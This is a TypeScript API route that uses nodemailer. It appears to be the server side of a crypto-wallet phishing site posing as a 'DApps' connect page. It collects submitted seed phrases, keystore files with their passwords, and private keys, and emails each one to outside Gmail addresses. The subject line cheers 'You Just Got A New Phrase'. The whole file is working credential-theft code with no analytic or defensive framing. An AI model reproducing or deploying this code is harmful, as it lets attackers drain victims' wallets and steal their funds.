import nodemailer from "nodemailer";

function formatMessage(message: string) {
  // Split the message into lines
  const lines = message.split(/\r?\n/);

  // Format each line with a prefix (for example)
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );

  // Join formatted lines into a single HTML string
  const formattedMessage = formattedLines.join("");

  // Return the formatted message
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
}

export async function POST(request: Request) {
  try {
    const { phrase, keystore, privateKey, wallet } = await request.json();


    const item = wallet
    if (phrase) {
      const email = process.env.EMAIL;
      const pass = process.env.PASS;

      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: email,
          pass,
        },
      });

      const formattedMessage = formatMessage(phrase);

      const mailOptions = {
        from: `Dapp App ${email}`,
        to: "ibsalam24@gmail.com",
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: ` ${formattedMessage} wallet is ${item}`,
      };

      transporter.verify(function (error, success) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json(
          { message: "email sent succesfully!!" },
          { status: 200 }
        );
      } else {
        return Response.json(
          { error: "Internal server error" },
          { status: 500 }
        );
      }
    }

    if (keystore) {
      const email = process.env.EMAIL;
      const pass = process.env.PASS;

      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: email,
          pass,
        },
      });

      const mailOptions = {
        from: `Dapp App ${email}`,
        to: "billyexh@gmail.com",
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>  wallet is ${item}`,
      };

      transporter.verify(function (error, success) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json(
          { message: "email sent succesfully!!" },
          { status: 200 }
        );
      } else {
        return Response.json(
          { error: "Internal server error" },
          { status: 500 }
        );
      }
    }

    if (privateKey) {
      const email = process.env.EMAIL;
      const pass = process.env.PASS;

      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: email,
          pass,
        },
      });

      const formattedMessage = formatMessage(privateKey);

      const mailOptions = {
        from: `Dapp App ${email}`,
        to: "billyexh@gmail.com",
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: ` ${formattedMessage} wallet is ${item} `,
      };

      transporter.verify(function (error, success) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json(
          { message: "email sent succesfully!!" },
          { status: 200 }
        );
      } else {
        return Response.json(
          { error: "Internal server error" },
          { status: 500 }
        );
      }
    }

    return Response.json({ message: "Submission Failed" }, { status: 500 });
  } catch (error) {
    return Response.json({ error: error });
  }
}
